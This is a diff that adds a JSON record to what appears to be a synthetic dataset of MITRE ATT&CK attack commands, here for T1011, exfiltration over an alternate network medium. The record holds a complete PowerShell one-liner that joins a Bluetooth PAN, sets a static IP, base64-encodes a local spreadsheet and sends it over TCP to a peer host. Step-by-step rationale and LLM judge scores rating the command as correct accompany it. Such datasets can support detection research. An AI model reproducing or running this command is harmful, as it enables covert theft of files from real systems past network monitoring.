@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.25.83.2 255.255.255.252 | Out-Null; $data=[IO.File]::ReadAllBytes('C:\\Users\\Public\\fin.xlsx'); $b64=[Convert]::ToBase64String($data); $tcp=New-Object Net.Sockets.TcpClient; $tcp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.2'),0)); $tcp.Connect('172.25.83.1',52319); $ns=$tcp.GetStream(); $buf=[Text.Encoding]::UTF8.GetBytes($b64); $ns.Write($buf,0,$buf.Length); $ns.Close(); $tcp.Close()",
+  "explanation": "Pairs/connects to a Bluetooth NAP, configures the Bluetooth PAN interface, and exfiltrates a file as base64 over a custom TCP port bound to the Bluetooth IP, aligning with T1011 (alternate network medium).",
+  "rationale_steps": [
+    "Establish Bluetooth PAN via BluetoothCL to use a non-primary medium (Bluetooth).",
+    "Assign a static IP on the Bluetooth adapter with netsh to isolate traffic.",
+    "Base64-encode data to blend content while keeping commands unobfuscated.",
+    "Bind TCP client to the Bluetooth IP to force egress over Bluetooth and send to a high, uncommon port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-3407e080",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/braces, valid separators, and correct invocation of external commands and .NET methods.",
+        "semantic_score": 4,
+        "semantic_justification": "It attempts Bluetooth NAP connection, configures a PAN IP, binds a TCP client to that interface, and sends base64 file data to a peer, though IP configuration typically needs admin rights and BluetoothCL’s NAP connect support may vary.",
+        "combined_score": 4.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T00:44:49.920497Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with balanced parentheses, proper semicolon separators, correct .NET object instantiation syntax, and valid piping constructs throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1011 by connecting to a Bluetooth NAP device via MAC address, dynamically identifying and configuring the Bluetooth PAN network interface with a static IP, reading a target file, base64-encoding it, and exfiltrating it over a TCP connection bound specifically to the Bluetooth interface IP — fully leveraging an alternate network medium for exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 0.82,
+        "timestamp": "2026-02-18T22:01:52.299348Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly formed PowerShell with correct use of semicolons, .NET classes, and variable interpolation.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively demonstrates exfiltration over Bluetooth as described, though the use of netsh to set a static IP address requires administrative privileges, which contradicts the 'None' privilege level provided in the metadata.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:01:56.843333Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
